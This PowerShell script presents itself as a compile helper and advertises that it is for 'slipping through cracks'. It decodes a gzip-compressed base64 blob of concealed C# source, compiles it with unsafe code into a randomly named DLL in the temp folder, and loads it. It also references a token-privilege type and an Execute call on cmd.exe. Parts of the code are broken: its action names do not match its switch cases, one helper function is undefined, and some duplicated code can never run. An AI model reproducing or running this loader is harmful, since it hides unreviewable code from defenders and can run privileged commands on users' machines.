
<#
#̷\   ⼕龱ᗪ㠪⼕闩丂ㄒ龱尺 ᗪ㠪ᐯ㠪㇄龱尸爪㠪𝓝ㄒ
#̷\   🇵​​​​​🇴​​​​​🇼​​​​​🇪​​​​​🇷​​​​​🇸​​​​​🇭​​​​​🇪​​​​​🇱​​​​​🇱​​​​​ 🇸​​​​​🇨​​​​​🇷​​​​​🇮​​​​​🇵​​​​​🇹​​​​​ 🇧​​​​​🇾​​​​​ 🇨​​​​​🇴​​​​​🇩​​​​​🇪​​​​​🇨​​​​​🇦​​​​​🇸​​​​​🇹​​​​​🇴​​​​​🇷​​​​​@🇮​​​​​🇨​​​​​🇱​​​​​🇴​​​​​🇺​​​​​🇩​​​​​.🇨​​​​​🇴​​​​​🇲​​​​​
#>

[CmdletBinding(SupportsShouldProcess)]
param(
        [Parameter(Mandatory=$true)]
        [ValidateSet('CompressCode','DecompressCode','Compile','ListMembers')]
        [Alias('a')]
        [string]$Action,     
        [Parameter(Mandatory=$false)]
        [string]$ClassName,
        [Parameter(Mandatory=$false)]
        [string]$OutputPath      
    )



function Convert-ToPreCompiledScript {

    [CmdletBinding(SupportsShouldProcess)]
    param
    (
        [Parameter(Mandatory=$true,Position=0)]
        [ValidateScript({
            if(-Not ($_ | Test-Path) ){
                throw "File or folder does not exist"
            }
            if(-Not ($_ | Test-Path -PathType Leaf) ){
                throw "The Path argument must be a file. Directory paths are not allowed."
            }
            return $true 
        })]        
        [string]$InputScript,
        [Parameter(Mandatory=$false)]
        [string]$OutputScript,
        [Parameter(Mandatory=$false)]
        [string]$Raw
    )

    $Content = Get-Content -Path $InputScript -Raw
    $CompressedContent = Convert-ToBase64CompressedScriptBlock $Content
    if($Raw){
        return $CompressedContent
    }
    $StringDecl = '$ScriptString = "' + $CompressedContent + '"'
    if($PSBoundParameters.ContainsKey("OutputScript")){
        if(Test-Path $OutputScript) { 
            write-host "[Warning] " -f DarkRed -NoNewLine ; 
            write-host "File $OutputScript already exists... " -f DarkYellow -n
            $a=Read-Host -Prompt "Overwrite (y/N)?" ; 
            if($a -notmatch "y") {
                return;
            }
             
        }
        Set-Content -Path $OutputScript -Value "`n`n$StringDecl`n"
    }else{
        return $StringDecl
    }
    return ""
}



function Convert-ToBase64CompressedScriptBlock {

    [CmdletBinding(SupportsShouldProcess)]
    param
    (
        [Parameter(Mandatory=$true,Position=0)]
        $ScriptBlock
    )

    # Script block as String to Byte array
    [System.Text.Encoding] $Encoding = [System.Text.Encoding]::UTF8
    [Byte[]] $ScriptBlockEncoded = $Encoding.GetBytes($ScriptBlock)

    # Compress Byte array (gzip)
    [System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream $MemoryStream, ([System.IO.Compression.CompressionMode]::Compress)
    $GzipStream.Write($ScriptBlockEncoded, 0, $ScriptBlockEncoded.Length)
    $GzipStream.Close()
    $MemoryStream.Close()
    $ScriptBlockCompressed = $MemoryStream.ToArray()

    # Byte array to Base64
    [System.Convert]::ToBase64String($ScriptBlockCompressed)
}

function Convert-FromBase64CompressedScriptBlock {

    [CmdletBinding()] param(
        [String]
        $ScriptBlock
    )

    # Base64 to Byte array of compressed data
    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

    # Decompress data
    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
    $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
    $GzipStream.CopyTo($MemoryStream)
    $GzipStream.Close()
    $MemoryStream.Close()
    $InputStream.Close()
    [Byte[]] $ScriptBlockEncoded = $MemoryStream.ToArray()

    # Byte array to String
    [System.Text.Encoding] $Encoding = [System.Text.Encoding]::UTF8
    $Encoding.GetString($ScriptBlockEncoded) | Out-String
}




function Write-ChannelMessage{               # NOEXPORT   
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true,Position=0)]
        [string]$Message        
    )

    Write-Host "[$($Global:ChannelProps.Channel)] " -f $($Global:ChannelProps.TitleColor) -NoNewLine
    Write-Host "$Message" -f $($Global:ChannelProps.MessageColor)
}


function New-CustomAssembly{
    <#
        .SYNOPSIS
            Cmdlet to create a temporary assembly file (dll) with all the reference in it. Then include it in the script

        .EXAMPLE
            PS C:\>  
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true, 
            HelpMessage="Assembly name") ]
        [string]$Source,
        [Parameter(Mandatory=$false,ValueFromPipeline=$true, 
            HelpMessage="Assembly name") ]
        [switch]$Dll,
        [Parameter(Mandatory=$false)]
        [string]$OutputPath        
    )    
       

    $Refs = [System.Collections.ArrayList]::new()
    $Refs.Add("System.Windows.Forms")
    
    $CompilerOptions = '/unsafe'
    $OutputType = 'Library'

    #Try {
        if($Dll){

          $Result = Add-Type -TypeDefinition $Source -OutputAssembly $OutputPath -OutputType $OutputType -ReferencedAssemblies $Refs -PassThru 
          Write-Verbose "Add Type returned $Result"
          if(Test-Path $OutputPath){
            
            return $OutputPath
          }
        }
        else{
          return Add-Type $Source -PassThru 
        }

        return $null
   # }  
   # Catch {
   #     Write-Error "Failed to create $NewDll $_"
   # }    
}

Function Get-ClassMembers
{
    [CmdletBinding()]
    Param ()
    $TypeObj = [MyCustomClass]
    $RawMembers = $TypeObj.GetMembers()

    [System.Collections.ArrayList]$OutputMembers = @()
    Foreach ( $RawMember in $RawMembers ) {
        
        $OutputProps = [ordered]@{
            'Name'= $RawMember.Name
            'MemberType'= $RawMember.MemberType
        }
        $OutputMember = New-Object -TypeName psobject -Property $OutputProps
        $OutputMembers += $OutputMember
    }
    $OutputMembers | Select-Object -Property * -Unique
}

function Invoke-AssemblyCreation{                               
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true, 
            HelpMessage="Add the type") ]
        [switch]$Dll,        
        [Parameter(Mandatory=$false,ValueFromPipeline=$true, 
            HelpMessage="Add the type") ]
        [switch]$Import,
        [Parameter(Mandatory=$false)]
        [string]$OutputPath
    ) 



    $Source = Convert-FromBase64CompressedScriptBlock $Script:CsCode
    $Source = $Source.Replace('___CLASS_NAME___', $Script:CLASSNAME)

   # try{
      $SourceLen = $Source.Length
      if($Dll){
        $Result = New-CustomAssembly $Source -Dll -OutputPath $OutputPath
        if($Result -eq $Null) {  $Result = [MyCustomClass] ; return $Result}
        if($Import){
            $Obj = Add-Type -LiteralPath "$OutputPath" -Passthru -ErrorAction Stop  
            Write-Host "Custom Library Loaded ]$OutputPath"    
            
            return $Obj
        }

        
      }else{
        $Result = New-CustomAssembly $Source
        if($Result -eq $Null) {  $Result = [MyCustomClass] ; return $Result}
        $Obj = $Result
      }
    #}
    #catch{
    #  Write-Host "Custom Type initialisation error : $_"
    #}
}

function Invoke-CodeCompile{                               
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$false)]
        [string]$OutputPath
    )

    $type = Invoke-AssemblyCreation -Dll -Import -OutputPath $OutputPath

    return $type    
}


function Show-ExceptionDetails{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true)]
        [System.Management.Automation.ErrorRecord]$Record,
        [Parameter(Mandatory=$false)]
        [switch]$ShowStack
    )       
    $formatstring = "{0}`n{1}"
    $fields = $Record.FullyQualifiedErrorId,$Record.Exception.ToString()
    $ExceptMsg=($formatstring -f $fields)
    $Stack=$Record.ScriptStackTrace
    Write-Host "`n[ERROR] -> " -NoNewLine -ForegroundColor DarkRed; 
    Write-Host "$ExceptMsg`n`n" -ForegroundColor DarkYellow
    if($ShowStack){
        Write-Host "--stack begin--" -ForegroundColor DarkGreen
        Write-Host "$Stack" -ForegroundColor Gray  
        Write-Host "--stack end--`n" -ForegroundColor DarkGreen       
    }
}  


function Decompress {
    $Source = Convert-FromBase64CompressedScriptBlock $Script:CsCode
    Set-Content -Path "$Script:DecompiledScript" -Value $Source 
}

function Compress{
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$false)]
        [switch]$Test
    )
    $Source = Get-Content "$Script:SourceFile" -Raw
    $EncodedB64 = Convert-ToBase64CompressedScriptBlock $Source

    $Variable = '$Script:CsCode = "' + $EncodedB64 + '"'
    $Variable

    if($Test){
        $s = Convert-FromBase64CompressedScriptBlock $EncodedB64
        Set-Content "$Script:DecompiledScript" -Value $s 

        (Get-FileHash "$Script:SourceFile").Hash
        (Get-FileHash "$Script:DecompiledScript").Hash
        $c=(Get-Command "ConsoleCompare.exe").Source
        &"$c" "$Script:SourceFile" "$Script:DecompiledScript"
    }
}

$Script:CLASSNAME    = 'MyCustomClass'
$Script:OutputPath   = ''
$Script:CsCode       = "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"
$Script:SourceFile   = (Resolve-Path "$pwd\src\source.cs").Path
$Script:DecompiledScript =Resolve-UnverifiedPath -Path "$pwd\tmp\decompiled.cs"

try{



    if($PSBoundParameters.ContainsKey("ClassName") -eq $True){
        $Script:CLASSNAME = $ClassName
    }

    if($PSBoundParameters.ContainsKey("OutputPath") -eq $True){
        $Script:OutputPath = $OutputPath
    }else{
        [string]$Random = (New-Guid).Guid
        $Random = $Random.SubString(26)
        $Random += '.dll'
        [string]$NewFile = Join-Path "$ENV:Temp" "$Random"

        $Script:OutputPath = $NewFile
    }


    $Maj = $PSVersionTable.PSVersion.Major
    if($Maj -ne 5){
         Write-Host "[version mismatch] " -f DarkRed -n
         Write-Host " Only supported version is 5 for now..." -f DarkYellow

         return
    }

    Write-Host "=============================================" -f DarkRed
    Write-Host " Swiss-Army-Knife type script/app with the   " -f DarkYellow;
    Write-Host " goal of slipping through cracks, Helping    " -f DarkYellow;
    Write-Host " the fats and the geeks in scoring higher    " -f DarkYellow;
    Write-Host "=============================================" -f DarkRed 

    switch($Action){
        "ListMembers"  { Get-ClassMembers }
        "Compress"     { Compress -Test:$Test }
        "Decompress"   { Decompress }
        "Compile"      {
                $ClassExists = $True
                try{
                    $uid = [dsf]::TokPriv1Luid
                }catch{
                    $ClassExists = $False
                }

      
                Write-Host "CLASSNAME  `t" -NoNewLine -f DarkYellow ; Write-Host "$Script:CLASSNAME" -f Gray 
                Write-Host "OutputDll  `t" -NoNewLine -f DarkYellow;  Write-Host "$Script:OutputPath" -f Gray 
                Write-Host "SourceFile `t" -NoNewLine -f DarkYellow;  Write-Host "$Script:SourceFile" -f Gray 


                if($ClassExists){
                    Write-Host "[Error] `t" -NoNewLine -f DarkRed;
                    Write-Host "$Script:CLASSNAME Already Loaded... Use another session or change class name" -f DarkYellow
                    return
                }

                Invoke-CodeCompile -OutputPath $Script:OutputPath
                Write-Host "[Completed] `t" -NoNewLine -f DarkGreen;  Write-Host "Use $Script:OutputPath" -f Gray   
                return
                [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Script:OutputPath"))

                '[MyCustomClass]::Execute("C:\Windows\System32\cmd.exe")'

                $ClassExists = $True
                try{
                    $uid = [dsf]::TokPriv1Luid
                }catch{
                    $ClassExists = $False
                }

                Write-Host "===============================================================================" -f DarkRed
                Write-Host "DLL COMPILATION USING .NET" -f DarkYellow;
                Write-Host "===============================================================================" -f DarkRed    
                Write-Host "CLASSNAME  `t" -NoNewLine -f DarkYellow ; Write-Host "$Script:CLASSNAME" -f Gray 
                Write-Host "OutputDll  `t" -NoNewLine -f DarkYellow;  Write-Host "$Script:OutputDll" -f Gray 
                Write-Host "SourceFile `t" -NoNewLine -f DarkYellow;  Write-Host "$Script:SourceFile" -f Gray 


                if($ClassExists){
                    Write-Host "[Error] `t" -NoNewLine -f DarkRed;
                    Write-Host "$Script:CLASSNAME Already Loaded... Use another session or change class name" -f DarkYellow
                    return
                }

                Invoke-CodeCompile -OutputPath $Script:OutputPath
                Write-Host "[Completed] `t" -NoNewLine -f DarkGreen;  Write-Host "Use $Script:OutputPath" -f Gray   
                return
                [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Script:OutputPath"))
                '[MyCustomClass]::Execute("C:\Windows\System32\cmd.exe")'
        }
    }
}catch{
    Show-ExceptionDetails $_ ;
}
